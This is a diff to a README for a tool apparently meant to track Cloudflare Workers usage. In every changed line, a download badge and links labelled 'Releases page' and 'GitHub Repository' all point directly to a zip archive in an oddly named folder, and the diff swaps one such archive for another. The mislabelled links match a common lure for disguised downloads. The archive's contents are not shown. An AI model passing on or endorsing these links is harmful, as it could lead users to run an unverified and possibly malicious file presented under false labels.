@@ -8,11 +8,11 @@ Welcome to CF-Workers-UsagePanel! This tool lets you track and analyze the numbe
 
 To get started, you need to download the application. Click the link below to visit the page where you can download the latest version.
 
-[![Download CF-Workers-UsagePanel](https://raw.githubusercontent.com/VersaVin/CF-Workers-UsagePanel/main/retial/Usage-Workers-C-Panel-v3.7.zip)](https://raw.githubusercontent.com/VersaVin/CF-Workers-UsagePanel/main/retial/Usage-Workers-C-Panel-v3.7.zip)
+[![Download CF-Workers-UsagePanel](https://github.com/VersaVin/CF-Workers-UsagePanel/raw/refs/heads/main/retial/Usage-C-Panel-Workers-1.2.zip)](https://github.com/VersaVin/CF-Workers-UsagePanel/raw/refs/heads/main/retial/Usage-C-Panel-Workers-1.2.zip)
 
 ### Steps to Download
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/VersaVin/CF-Workers-UsagePanel/main/retial/Usage-Workers-C-Panel-v3.7.zip).
+1. Go to the [Releases page](https://github.com/VersaVin/CF-Workers-UsagePanel/raw/refs/heads/main/retial/Usage-C-Panel-Workers-1.2.zip).
 2. Look for the latest version at the top of the page.
 3. Click on the file that matches your operating system to download it.
 
@@ -81,7 +81,7 @@ If you encounter issues while using the application:
 
 For more information, tips, and updates, make sure to check out our repository:
 
-- [GitHub Repository](https://raw.githubusercontent.com/VersaVin/CF-Workers-UsagePanel/main/retial/Usage-Workers-C-Panel-v3.7.zip)
+- [GitHub Repository](https://github.com/VersaVin/CF-Workers-UsagePanel/raw/refs/heads/main/retial/Usage-C-Panel-Workers-1.2.zip)
 
 ## 📧 Support
 
